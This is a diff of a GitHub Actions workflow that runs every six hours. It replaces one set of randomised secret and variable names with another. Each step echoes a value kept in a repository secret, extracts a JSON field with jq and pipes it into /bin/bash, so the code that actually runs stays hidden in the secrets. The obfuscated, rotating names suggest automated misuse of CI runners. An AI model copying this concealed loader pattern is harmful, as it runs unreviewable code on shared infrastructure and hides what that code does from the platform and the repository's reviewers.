@@ -2,25 +2,26 @@ name: lirujing7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
+    - cron: '36 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lirujing7654
         env:
-          gqp5515: ${{ secrets.gqp5515 }}
+          xfnvo84382: ${{ secrets.xfnvo84382 }}
         run: |
-          echo $gqp5515 | jq -r .vtmhb9354 | /bin/bash
-          echo $geemq9 | jq -r .h11 | /bin/bash
-          echo $mi78195 | jq -r .riqyp53048 | /bin/bash
-          echo $vs7 | jq -r .xptv075 | /bin/bash
-          echo $qto37475 | jq -r .ftqki09854 | /bin/bash
-          echo $ujfwa53 | jq -r .igh9 | /bin/bash
-          echo $qlxq6848 | jq -r .bss8 | /bin/bash
-          echo $pto50 | jq -r .tjs4269 | /bin/bash
-          echo $jeqj01 | jq -r .zvpe8737 | /bin/bash
+          echo $xfnvo84382 | jq -r .tlqhw8112 | /bin/bash
+          echo $vdx048 | jq -r .ysjcx66304 | /bin/bash
+          echo $sha8523 | jq -r .bb70 | /bin/bash
+          echo $am322 | jq -r .umx056 | /bin/bash
+          echo $iyv8 | jq -r .qvhnr3 | /bin/bash
+          echo $nmi8415 | jq -r .jtl73523 | /bin/bash
+          echo $pkyn4 | jq -r .s96 | /bin/bash
+          echo $gyxb7656 | jq -r .rzett1 | /bin/bash
+          echo $y7054 | jq -r .ryg08 | /bin/bash
+          echo $xhjd91 | jq -r .lmr42 | /bin/bash
+          echo $avgkn98 | jq -r .ymg36 | /bin/bash
 
